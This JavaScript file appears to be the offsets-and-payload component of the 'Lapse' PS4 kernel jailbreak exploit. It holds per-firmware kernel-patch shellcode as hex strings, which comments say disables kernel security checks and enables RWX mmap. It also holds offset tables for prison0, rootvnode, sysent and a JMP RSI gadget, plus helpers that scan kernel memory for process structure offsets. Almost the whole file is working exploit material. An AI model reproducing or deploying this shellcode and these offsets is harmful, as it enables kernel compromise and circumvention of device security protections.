// PS4 Kernel Offsets for Lapse exploit
// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py

// Kernel patch shellcode (hex strings) - patches security checks in kernel
// These are executed via kexec after jailbreak to enable full functionality
const kpatch_shellcode = {
    "9.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3",
    "9.03": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3",
    "9.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3",
    "10.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3",
    "10.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3",
    "11.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.02": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
    "12.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
};

// Mmap RWX patch offsets per firmware (for verification)
// These are the offsets where 0x33 is patched to 0x37
const kpatch_mmap_offsets = {
    "9.00": [0x156326a, 0x156326d],  // TODO: verify
    "9.03": [0x156262a, 0x156262d],  // TODO: verify
    "9.50": [0x122d7a, 0x122d7d],    // TODO: verify
    "10.00": [0xed59a, 0xed59d],     // TODO: verify
    "10.50": [0x19c42a, 0x19c42d],   // TODO: verify
    "11.00": [0x15626a, 0x15626d],
    "11.02": [0x15628a, 0x15628d],
    "11.50": [0x1fa63a, 0x1fa63d],
    "12.00": [0x1fa71a, 0x1fa71d],
};

function get_mmap_patch_offsets(fw_version) {
    // Normalize version
    let lookup = fw_version;
    if (fw_version === "9.04") lookup = "9.03";
    else if (fw_version === "9.51" || fw_version === "9.60") lookup = "9.50";
    else if (fw_version === "10.01") lookup = "10.00";
    else if (fw_version === "10.70" || fw_version === "10.71") lookup = "10.50";
    else if (fw_version === "11.52") lookup = "11.50";
    else if (fw_version === "12.02") lookup = "12.00";

    return kpatch_mmap_offsets[lookup] || null;
}

// Helper to convert hex string to byte array
function hexToBytes(hex) {
    const bytes = [];
    for (let i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

// Get kernel patch shellcode for firmware version
function get_kpatch_shellcode(fw_version) {
    // Normalize version for lookup
    let lookup_version = fw_version;

    // Map similar versions
    if (fw_version === "9.04") lookup_version = "9.03";
    else if (fw_version === "9.51" || fw_version === "9.60") lookup_version = "9.50";
    else if (fw_version === "10.01") lookup_version = "10.00";
    else if (fw_version === "10.70" || fw_version === "10.71") lookup_version = "10.50";
    else if (fw_version === "11.52") lookup_version = "11.50";
    else if (fw_version === "12.02") lookup_version = "12.00";

    const hex = kpatch_shellcode[lookup_version];
    if (!hex) {
        return null;
    }
    return hexToBytes(hex);
}

// Firmware-specific offsets for PS4

offset_ps4_9_00 = {
    EVF_OFFSET: 0x7F6F27n,
    PRISON0: 0x111F870n,
    ROOTVNODE: 0x21EFF20n,
    TARGET_ID_OFFSET: 0x221688Dn,
    SYSENT_661: 0x1107F00n,
    JMP_RSI_GADGET: 0x4C7ADn,
};

offset_ps4_9_03 = {
    EVF_OFFSET: 0x7F4CE7n,
    PRISON0: 0x111B840n,
    ROOTVNODE: 0x21EBF20n,
    TARGET_ID_OFFSET: 0x221288Dn,
    SYSENT_661: 0x1103F00n,
    JMP_RSI_GADGET: 0x5325Bn,
};

offset_ps4_9_50 = {
    EVF_OFFSET: 0x769A88n,
    PRISON0: 0x11137D0n,
    ROOTVNODE: 0x21A6C30n,
    TARGET_ID_OFFSET: 0x221A40Dn,
    SYSENT_661: 0x1100EE0n,
    JMP_RSI_GADGET: 0x15A6Dn,
};

offset_ps4_10_00 = {
    EVF_OFFSET: 0x7B5133n,
    PRISON0: 0x111B8B0n,
    ROOTVNODE: 0x1B25BD0n,
    TARGET_ID_OFFSET: 0x1B9E08Dn,
    SYSENT_661: 0x110A980n,
    JMP_RSI_GADGET: 0x68B1n,
};

offset_ps4_10_50 = {
    EVF_OFFSET: 0x7A7B14n,
    PRISON0: 0x111B910n,
    ROOTVNODE: 0x1BF81F0n,
    TARGET_ID_OFFSET: 0x1BE460Dn,
    SYSENT_661: 0x110A5B0n,
    JMP_RSI_GADGET: 0x50DEDn,
};

offset_ps4_11_00 = {
    EVF_OFFSET: 0x7FC26Fn,
    PRISON0: 0x111F830n,
    ROOTVNODE: 0x2116640n,
    TARGET_ID_OFFSET: 0x221C60Dn,
    SYSENT_661: 0x1109350n,
    JMP_RSI_GADGET: 0x71A21n,
};

offset_ps4_11_02 = {
    EVF_OFFSET: 0x7FC22Fn,
    PRISON0: 0x111F830n,
    ROOTVNODE: 0x2116640n,
    TARGET_ID_OFFSET: 0x221C60Dn,
    SYSENT_661: 0x1109350n,
    JMP_RSI_GADGET: 0x71A21n,
};

offset_ps4_11_50 = {
    EVF_OFFSET: 0x784318n,
    PRISON0: 0x111FA18n,
    ROOTVNODE: 0x2136E90n,
    TARGET_ID_OFFSET: 0x21CC60Dn,
    SYSENT_661: 0x110A760n,
    JMP_RSI_GADGET: 0x704D5n,
};

offset_ps4_12_00 = {
    EVF_OFFSET: 0x784798n,
    PRISON0: 0x111FA18n,
    ROOTVNODE: 0x2136E90n,
    TARGET_ID_OFFSET: 0x21CC60Dn,
    SYSENT_661: 0x110A760n,
    JMP_RSI_GADGET: 0x47B31n,
};

// Map firmware versions to offset objects
ps4_kernel_offset_list = {
    "9.00": offset_ps4_9_00,
    "9.03": offset_ps4_9_03,
    "9.04": offset_ps4_9_03,
    "9.50": offset_ps4_9_50,
    "9.51": offset_ps4_9_50,
    "9.60": offset_ps4_9_50,
    "10.00": offset_ps4_10_00,
    "10.01": offset_ps4_10_00,
    "10.50": offset_ps4_10_50,
    "10.70": offset_ps4_10_50,
    "10.71": offset_ps4_10_50,
    "11.00": offset_ps4_11_00,
    "11.02": offset_ps4_11_02,
    "11.50": offset_ps4_11_50,
    "11.52": offset_ps4_11_50,
    "12.00": offset_ps4_12_00,
    "12.02": offset_ps4_12_00,
};

kernel_offset = null;

function get_kernel_offset(FW_VERSION) {
    const fw_offsets = ps4_kernel_offset_list[FW_VERSION];

    if (!fw_offsets) {
        throw new Error("Unsupported PS4 firmware version: " + FW_VERSION);
    }

    kernel_offset = { ...fw_offsets };

    // PS4-specific proc structure offsets
    kernel_offset.PROC_FD = 0x48n;
    kernel_offset.PROC_PID = 0xB0n;       // PS4 = 0xB0, PS5 = 0xBC
    kernel_offset.PROC_VM_SPACE = 0x200n;
    kernel_offset.PROC_UCRED = 0x40n;
    kernel_offset.PROC_COMM = -1n;        // Found dynamically
    kernel_offset.PROC_SYSENT = -1n;      // Found dynamically

    // filedesc - PS4 different from PS5
    kernel_offset.FILEDESC_OFILES = 0x0n;  // PS4 = 0x0, PS5 = 0x8
    kernel_offset.SIZEOF_OFILES = 0x8n;    // PS4 = 0x8, PS5 = 0x30

    // vmspace structure
    kernel_offset.VMSPACE_VM_PMAP = -1n;

    // pmap structure
    kernel_offset.PMAP_CR3 = 0x28n;

    // socket/net - PS4 specific
    kernel_offset.SO_PCB = 0x18n;
    kernel_offset.INPCB_PKTOPTS = 0x118n;  // PS4 = 0x118, PS5 = 0x120

    // pktopts structure - PS4 specific
    kernel_offset.IP6PO_TCLASS = 0xB0n;    // PS4 = 0xB0, PS5 = 0xC0
    kernel_offset.IP6PO_RTHDR = 0x68n;     // PS4 = 0x68, PS5 = 0x70

    return kernel_offset;
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);

    // Look for patterns to find dynamic offsets
    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");

    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }

    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }

    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);

    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function update_kernel_offsets() {
    const offsets = find_proc_offsets();

    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}
